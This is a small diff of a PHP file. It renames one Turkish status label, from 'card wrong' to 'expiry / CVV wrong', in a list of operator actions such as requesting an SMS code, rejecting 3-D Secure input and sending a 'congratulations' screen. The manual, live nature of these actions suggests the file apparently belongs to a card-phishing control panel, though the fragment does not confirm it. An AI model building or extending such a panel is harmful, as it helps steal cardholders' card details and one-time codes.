@@ -72,7 +72,7 @@ if ($tip === 'aksiyon') {
                 '3d_gonder'              => '📩 SMS istendi',
                 '3d_hatali'              => '❌ Hatalı 3D',
                 'tebrik'                 => '✅ Tebrik gönderildi',
-                'kart_hatali'            => '💳 Kart hatalı',
+                'kart_hatali'            => '💳 Skt / Cvv hatalı',
                 'eticaret_kapali'        => '🚫 E-ticaret kapalı',
                 'limit_yetersiz'         => '💰 Limit yetersiz',
                 'kart_desteklenmiyor'    => '🔕 Kart desteklenmiyor',
